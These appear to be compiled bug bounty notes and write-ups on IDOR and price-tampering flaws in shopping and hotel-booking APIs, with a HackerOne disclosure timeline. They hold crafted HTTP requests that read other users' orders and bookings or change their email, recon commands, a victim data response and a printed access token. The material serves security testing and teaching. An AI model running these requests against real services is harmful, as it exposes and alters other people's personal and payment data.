While testing a popular e-commerce platform’s API, I noticed an endpoint `/api/v1/order/export` that allowed users to export their order history as a CSV file. On closer inspection, the `user_id` parameter was exposed. Curious, I decided to probe further.

Step 1: Reconnaissance with Postman Postman is a go-to tool for API exploration. Using Postman, I sent a GET request with an altered `user_id`:

```
GET /api/v1/order/export?user_id=12345 HTTP/1.1  
Host: example.com  
Authorization: Bearer eyJhbGciOiJI...
```

The response was surprising — it returned order data for a completely different user! This pointed to an Insecure Direct Object Reference (IDOR) vulnerability.

Step 2: Mapping the API Endpoints Using Burp Suite, I intercepted API traffic and generated a map of endpoints. The vulnerable endpoint stood out because it accepted user-modifiable parameters without proper validation.

### Exploit: Turning the Discovery into a Report

To escalate the finding, I tested if I could modify sensitive user details through another API endpoint. Here’s what I uncovered:

The `/api/v1/user/update` Endpoint: This endpoint allowed updates to user profiles. Sending a crafted POST request like the following let me change email addresses of other users:

```http
POST /api/v1/user/update HTTP/1.1  
Host: example.com  
Authorization: Bearer eyJhbGciOiJI...  
Content-Type: application/json  
  
{  
"user_id": 12345,  
"email": "attacker@example.com"  
}
```


----

#### Access Control

Access control is another critical area to focus on:

- **Role-Based Access Control (RBAC)**: Test if users can access resources or perform actions outside their assigned roles, such as viewing or editing admin-only content.
- **Horizontal Privilege Escalation**: Try to access or modify data belonging to other users, such as changing their passwords or viewing private information.
- **Vertical Privilege Escalation**: See if you can elevate your privileges from a normal user to an admin by exploiting flaws in the access control mechanisms.
- **Insecure Direct Object References (IDOR)**: Check if objects like files, databases, or resources can be accessed directly by manipulating identifiers in the URL or request.

<iframe width="928" height="522" src="https://www.youtube.com/embed/uoXyhnXQyfc" title="Hacking Websites | Broken Access Control" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

## POCs:

### Price manipulation/Tampering

####  Product Purchase

- **Product ID Manipulation**: Change the product ID to see if you can purchase higher-valued items at a lower price.
- **Voucher Exploits**: Manipulate gift voucher values to maximize profit.
- **Cart Tampering**: Modify cart parameters during checkout to change prices or other details.
- **Mail Forwarding**: Test account pages for vulnerabilities that allow mail forwarding via code injection.
- **Product ID Mismatch**: Pass different product IDs to pay for a cheaper product.
- **Negative Values**: Test how the application handles negative values in pricing.

e.g:


![[Pasted image 20250202151309.png]]


-> confirm the order and intercept the request:

![[Pasted image 20250202151704.png]]

Now to search at the right request, we look for the price we  ordered
(in this case 750) to find it as a **match:**


![[Pasted image 20250202152236.png]]

if you can't find the req. Then try adding the adress if the WebApp asks it:

![[Pasted image 20250202152834.png]]

![[Pasted image 20250202153925.png]]

And click "continue" then look for the req.

![[Pasted image 20250202154016.png]]

Or look for your total price:

![[Pasted image 20250202155502.png]]

change parameters:

![[Pasted image 20250202154707.png]]

Send forward and look for the response in the browser:

![[Pasted image 20250202155834.png]]


## example of a IDOR on profile page:

So first off, visit the profile page of the Web App, then turn intercept on and reload the page

![[Pasted image 20241207133801.png]]

We send to repeater this api request and send it to see the reponse: 

(Because we can see the uuid inside)

![[Pasted image 20241207133940.png]]

				request

After sending the request with our user id, we can see that our data gets reflected back at us:

![[Pasted image 20241207135024.png]]

		request attributes

![[Pasted image 20241207134244.png]]

So the first thing you wanna do, is to select the user id, click on "inspector" and change it with another valid user, you can do this by **creating another account and intercepting the user id by the profile.** 

![[Pasted image 20241207135012.png]]

response:

![[Pasted image 20241207135059.png]]

P.S: try for  IDORs in "edit Profile" page too with two accounts and try changing the id:

![[Pasted image 20241207145213.png]]

###  Poc of IDOR worth $1250

make a shipping payment:

![[Pasted image 20241215003042.png]]

continue order:

![[Pasted image 20241215003212.png]]

There is a comment section, where we can try to hunt for idor, in case it has id, so let's intercept it:

![[Pasted image 20241215003858.png]]


![[Pasted image 20241215001915.png]]

And then we send the request, after that, we can go back to the shopify dashboard and look for the comment:

![[Pasted image 20241215004045.png]]

![[Pasted image 20241215002056.png]]

Now to look for the ID, we will intercept the request before publishing it:

![[Pasted image 20241215004134.png]]

								intercept

Send to repeater and try changing the id to a valid one:


![[Pasted image 20241215002137.png]]

![[Pasted image 20241215002157.png]]

---

# Impact of my this Attack :

Exposure of sensitive data, including addresses, order details, phone numbers, apartment details, payment QR codes, etc... ( Personal Identifiable Information - PII Data Leakage )

### **Overview of a domain on which was I Testing :**

Subdomain on which I was testing is designed for general shopping, I discovered that all the typical functionalities were accessible, including login, product selection, cart management, ordering, online payments, and cash on delivery (CoD) options.”

# **Which Functionality was Vulnerable to IDOR?**

After exploring the site manually, I observed a unique functionality compared to other shopping platforms. 

Typically, upon ordering a product, immediate payment confirmation is required. However, here, after a successful purchase, a timer of 3–4 days is provided for final payment confirmation before the order is dispatched to your home. If payment isn’t completed within this time, the order is automatically canceled.


So, I have decided to test this functionality. I  choosed 1 product and make an order but I din’t  do the  payment.

So, after doing the order, it gives me 3 options,

1. **Order Documents** : View details like product information, address, quantity, amount, and payment options (by Downloading in PDF format).
2. **Help With Ordering :** To get help about the product ( support ).
3. **Cancel The Order :** To cancel the Order.

I turn on the intercept while clicking on “**Order Document**”.

Luckily, I saw that, Server uses “**orderId**” parameter to identify and handle each and every order. ( The biggest advantage was that it is generating a numbered id like, 123456, 654321, 789456, etc.. so Attacker can easily Brute force this).

I sent this request to Repeater Tab. I have Immediately just change the last digit of the “**orderId**” Parameter.

![](https://miro.medium.com/v2/resize:fit:514/1*eQgJ7Fe8JdPwAs5ha8vKpA.jpeg)

1st URL contains data about Product Suppliers and 2nd URL contains data about payment invoice, like First name, Last, name, physical address, date of order, amount, product name, apartment details, etc… ( In PDF format ).

![](https://miro.medium.com/v2/resize:fit:788/1*OZDnAbTfshhEqVhNhzcUCw.jpeg)

---

### How **Unguessable** IDOR Worth me €1000 On Intigriti

Recently, I was hacking on one of Intigriti’s private program, It was a medium scope target. Let’s say the target was **_xxx_** _Organization._

Here’s how I did it:

1. **Collecting URLs:**

```bash
cat subs.txt | httpx-toolkit -o urls.txt  
  
cat urls.txt | waybackurls > wayback_urls  
  
cat urls.txt | katana -o katana_urls  
  
cat urls.txt | gauplus > gauplus_urls
```

**2. Filtering out duplicates:** After gathering URLs, I had to clean up the list to remove duplicates and unnecessary parameters. For that, I used **uro** and **urless** tools. Here’s how:

```bash
cat wayback_urls katana_urls gauplua_urls | sort -u | uro | urless > filtered_endpoints.txt
```

Even after cleaning, I still had a thousands of endpoints. So, the next step was to look for API endpoints manually one by one, especially since I love finding IDOR (Insecure Direct Object Reference) vulnerabilities in APIs. I did this by searching for `/api/` paths:

therefore I searched like this:

```bash
cat filtered_endpoints.txt | grep /api/
```

After reviewing the results, I found a few interesting endpoints like:

```
https://xxx.com/api/payment-site/payment-{unguessable_ID}/start  
https://xxx.com/api/payment-site/payment-{unguessable_ID}/start
```

So, I just reported the vulnerability, the triager also asked me: This looks like a classical IDOR. How did you guess the UUIDs?

Here is your answer:

![](https://miro.medium.com/v2/resize:fit:788/1*b7ERCRSBEKXJYZT-0hHaWQ.jpeg)

Ultimately, the vulnerability was accepted as a **high severity** issue rather than a **critical one**. The reasoning was simple: although the ID was unguessable, the lack of proper **authorization** still left the system vulnerable, making it a serious issue that needed fixing.

![](https://miro.medium.com/v2/resize:fit:788/1*qoK68v4wGi2U023wNmJh-w.jpeg)

---
## IDOR at the Get Payment Data Endpoint Leads to Personal Identifiable Information (PII) Disclosure

source: https://freedium.cfd/https://medium.com/@blackarazi/idor-at-the-get-payment-data-endpoint-leads-to-personal-identifiable-information-pii-disclosure-7956c57058af

Some real-life cases of IDOR attacks:

1. [IDOR to add secondary users in www.paypal.com/businessmanage/users/api/v1/users](https://hackerone.com/reports/415081) to PayPal
2. [IDOR allow access to payments data of any user](https://hackerone.com/reports/751577) to Nord Security
3. [Insecure Direct Object Reference (IDOR) — Delete Campaigns](https://hackerone.com/reports/1969141) to HackerOne
4. [IDOR — Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertification GraphQL query](https://hackerone.com/reports/2122671) to HackerOne
5. [IDOR allows an attacker to modify the links of any user](https://hackerone.com/reports/1661113) to Reddit
6. [Starbucks IDOR: How we prevented an information leak of 6 million Starbucks customers](https://dreamlab.net/en/blog/post/starbucks-idor-how-we-prevented-an-information-leak-of-6-million-starbucks-customers/)

You can also check "[Top IDOR reports from HackerOne](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPIDOR.md)".

Company X has an iOS mobile app version & I focused on my favorite testing area which is API testing, so my plan is to use the mobile apps & inspect the API request using Burp proxy.

![None](https://miro.medium.com/v2/resize:fit:700/1*0j6hAk9vudfRNQV9ss8DiQ.png)

_Company X's iOS mobile app proxy to Burp_

This is where I casually use the mobile apps like normal users by exploring the functionality & after a while, this is where I found the vulnerability in the booking feature.

#### Steps To Reproduce

[1] Create 2 users `attacker` and `victim`.

[2] Let's say the `victim` already created a booking, and the `booking_id` is `295081245`.

[3] Now as `attacker`, log in to company X's mobile apps, in this case, I'm using the iOS app, and turn on the Burp proxy to get the `Access Token`.

[4] Request the vulnerable endpoint to get sensitive information from the `victim`. We can use `Postman`.

Request:

```http
GET https://bff.redacted.com/v1/booking/get_payment_data/295081245/?channel=IOS%20App 
Headers: 
User-Agent: redacted-ios/9.0 (iPhone; iOS 15.8; Scale/2.00) 
Access_token: {{access_token}}
```

Response:

```http
{
    "header_widgets": null,
    "content_widgets": [],
    "content_widget_hidden_dividers": null,
    "bottom_sheet": null,
    "booking_object": {
        "price_lock": false,
        "show_tax_info": false,
        "phone_number": "REDACTED",
        "cancellation_charges_breakup_hash": [],
        "payable_amount": 245854.0,
        "is_offer_applicable": false,
        "get_amount_paid": 0.0,
        "get_real_amount_paid": 0.0,
        "id": "295081245",
        "hotel_id": 86177,
        "no_of_guest": 2,
        "roomCount": 1,
        "guest_name": "REDACTED",
        "guest_phone": "REDACTED",
        "guest_email": "REDACTED",
        "booking_rooms": [
            {
                "id": 365568362,
                "booking_id": 295081245,
                "no_of_person": 2,
                "no_of_adults": 2,
                "no_of_children": 0,
                "no_of_pets": 0,
                "no_of_babies": 0
            }
        ],
        "checkin": "2024-04-09",
        "checkout": "2024-04-10",
        "amount": 702438.0,
        "status": "Confirm Booking",
        "status_key": 0,
        "final_amount": 245854.0,
        "discount": 456584.0,
        "currency_symbol": "Rp",
        "roomNights": 1,
        "total_amount": 702438.0,
        "final_amount_excluding": 307317.0,
        "total_amount_including_extra_cost": "245854",
        "discounts_hash": [
            {
                "type": "coupon",
                "amount": 395121.0,
                "title": "Coupon Discount",
                "display_amount": null,
                "subtitle": [
                    "Coupon: "
                ]
            },
            {
                "type": "redacted_money",
                "amount": 61463.0,
                "title": "REDACTED MONEY DISCOUNT",
                "display_amount": null,
                "subtitle": [
                    "REDACTED XTRA DISCOUNT"
                ]
            }
        ],
        "payments_hash": [],
        "room_category": {
            "room_category_id": 30,
            "room_category_name": "Indonesia Standard Double"
        },
        "display_tariff": 702438.0,
        "hotel": {
            "id": 86177,
            "name": "REDACTED",
            "country_id": 96,
            "directions": "From REDACTED toll gate, take left (go east) to Jl. REDACTED. After 1 km, right after EMC Hospital, take left and follow the lane. On the roundabout take the second exit. After 500 m, the property will be on the left. ",
            "formatted_checkin_time": "02:00 PM",
            "formatted_checkout_time": "12:00 PM",
            "address": "REDACTEDr",
            "category": "REDACTED Hotels",
            "currency_code": "IDR",
            "country_iso_code": "ID",
            "alternate_name": "Apartement REDACTED",
            "status": "Live",
            "latitude": "REDACTED",
            "longitude": "REDACTED",
            "city": "REDACTED",
            "phone": "REDACTED",
            "primary_contact": "REDACTED",
            "plot_number": "No. 40",
            "street": "REDACTED",
            "pincode": "REDACTED"
        },
        "static_display_text": {
            "header_text": "Your booking is confirmed",
            "sticky_text": "Confirmed Booking"
        },
        "pricing_details": [
            {
                "title": "Room price for 1 night X 2 guests",
                "amount": 702438.0,
                "type": "room_tariff"
            }
        ],
        "payment_details": [
            {
                "title": "Coupon Discount",
                "amount": 395121.0,
                "type": "coupon"
            },
            {
                "title": " MONEY",
                "amount": 61463.0,
                "type": "redacted_money"
            }
        ],
        "created_at": "2024-02-05T18:10:29.570+05:30",
        "booking_policies": {
            "title": "Booking Policies",
            "data": [
                {
                    "id": "dp6"
                }
            ]
        },
        "invoice_no": "MNPS0830",
        "get_payment_status": "Pending",
        "amount_refunded": "0.0",
        "is_slot_booking": false,
        "slot_info": [],
        "is_modifiable": false,
        "booking_no": "MNPS0830",
        "refunds_hash": {
            "notice": "If refund is not received in next 10-12 days get in touch with us using your Booking id",
            "breakup": []
        },
        "tax_amount": 0,
        "guest": {
            "country_code": "+62"
        },
        "hotel_image": "https://images.redacted.com/uploads/hotel_image/86177/c49932e33ea1121f.jpg",
        "opted_services": {
            "meals": {}
        },
        "city": "REDACTED",
        "country_name": "REDACTED",
        "booking_amount_for_wizard": 307317.0,
        "is_corporate": false,
        "insurance_enabled": true,
        "money_refunded": 0.0,
        "amount_refundable": 61463,
        "money_refundable": 61463,
        "total_amount_refunded": 0,
        "cancellation_charges": 0,
        "total_amount_paid": 61463,
        "mor_flag": false,
        "occupancy_wise_room_config": {
            "2": 1
        },
        "source": "Web Booking",
        "program_info": [],
        "get_payment_status_id": 0,
        "soft_checkin_location_status": "PENDING",
        "noOfNights": 1,
        "_cashback_opted": false,
        "free_room_night_discount": {
            "discount_amount": 0,
            "discount_percentage": 0,
            "frn_code": null,
            "unit_discount_info": null
        }
    },
    "status_data": null,
    "experience_dialog_delay": null
}
```

As we can see, we are able to get sensitive information such as PII & payment information from the victim.

[5] After checking again, I discover that I'm actually using the `ANONYMOUS_GUEST` token, so for step 3 it's not necessary to log in to the mobile apps, so we can choose `I'll signup later` instead to get the `ANONYMOUS_GUEST` token.

Here's an example of the token information:

Request:

```http
GET https://bff.redacted.com/v2/users/anonymous_login?device_id=FFB8F993-F89D-47F6-ABC9-994B20586A79&lat=0&lon=0&magik_ab_disable=1&version=9.0

Headers:
User-Agent: redacted-ios/9.0 (iPhone; iOS 15.8; Scale/2.00)
Access_token: Q0s3RGV2M3hZcFp6QjRib2lIUmE6a1lWNjVGZXRrcWdOM0d6S3V5aEc=
```

Response:

```http
{
    "id": 195645906,
    "phone": null,
    "email": "ffb8f993-f89d-47f6-abc9-994b20586a79.anonymous@redacted.com",
    "city": null,
    "sex": null,
    "team": null,
    "role": "Guest",
    "address": null,
    "features": {
        "enable_chat": "false"
    },
    "ovhUser": false,
    "access_token": "F8cdvdVOlKmfRIB7DBhLow",
    "user_id": 108766585,
    "country_code": "+62",
    "first_name": "Guest",
    "last_name": null,
    "date_of_birth": null,
    "devise_role": "ANONYMOUS_GUEST",
    "phone_verified": false,
    "email_verified": true,
    "updated_at": 1707137689,
    "is_relationship_mode_on": null,
    "can_access_company_account": null,
    "can_access_profile": null,
    "can_change_commission": null,
    "home_page_type": "true",
    "country_iso_code": "ID"
}
```

[6] After digging deeper I actually found that another endpoint is also vulnerable `GET https://bff.redacted.com/v1/booking/{{booking_id}}`

![None](https://miro.medium.com/v2/resize:fit:700/1*MliPp8Z6AJy1w7kACNx3xw.png)

					Booking Detail Endpoint is also vulnerable

#### Impact

[1] Attackers could view the booking information of the victim which contains:

- Personal Infomation, e.g. `guest_name`, `guest_phone`, `guest_email`.
- Other sensitive information, e.g. `hotel_id`, `hotel_name`, `country_id`, `country_name`, `latitude`, `longitude`, `no_of_guest`, `roomCount`, `checkin`, `checkout`, etc.

[2] Attackers could view the payment booking information of the victim which contains `pricing_details`, `payment_details`, `amount_refundable`, `money_refundable`, `total_amount_paid`, `coupon_code`, `discounts`, etc.

#### Timeline

- [06/02/2024] Report submitted, status `New`
- [12/02/2024] First response from H1 analyst, requesting more info due to inability to reproduce the issue, status changed to `Needs more info`
- [13/02/2024] Add further explanation about the issue, status changed to `New`
- [14/02/2024] The H1 analyst is able to reproduce the issue, and the status changed to `Pending program review`, severity changed from High to Medium (5.9)
- [27/02/2024] Asking for updates
- [08/03/2024] Asking for updates
- [08/03/2024] First response from Company X, they said they're looking into this and will get back shortly
- [14/03/2024] Asking for updates
- [14/03/2024] Company X said that they are working on this internally & will get back with the results as soon as possible
- [05/04/2024] Asking for updates again, since it's been 2 months since the issue was reported & 3 weeks since the last update from Company X
- [05/04/2024] Company X said that they will let me by this week's end or mostly by next week.
- [15/04/2024] No updates after a week, asking for updates again
- [15/04/2024] Company X said that the team is investigating this issue and they understand that this is taking a bit longer due to multiple reports to be worked upon
- [15/04/2024] Company X said that they've been able to validate this and the team is working on a remediation plan. The status changed to `Triaged`
- [16/04/2024] Asking to update the severity to Critical based on HackerOne policy regarding `Leakage of Sensitive PII` [https://docs.hackerone.com/en/articles/8369826-detailed-platform-standards](https://docs.hackerone.com/en/articles/8369826-detailed-platform-standards)
- [23/04/2024] Company X said that the engineering team has deployed a fix for this so the issue should no longer be reproducible & asking for retest (ability to bypass the fix)
- [05/06/2024] Perform a retest & confirm that this issue is no longer reproducible. Asking for sharing the root cause & remediation step of this issue, since I'll be requesting a public disclosure & publish a write-up soon for this. Also friendly reminder to change the severity to Critical
- [26/06/2024] Submit the first draft of the public disclosure
- [09/07/2024] No updates after 2 weeks, asking for updates again
- [09/07/2024] Company X informed that as per the current VDP policy, the program does not allow public disclosure at this time. Severity upgraded to High.
- [17/07/2024] Made necessary changes to redact the company X information.

---

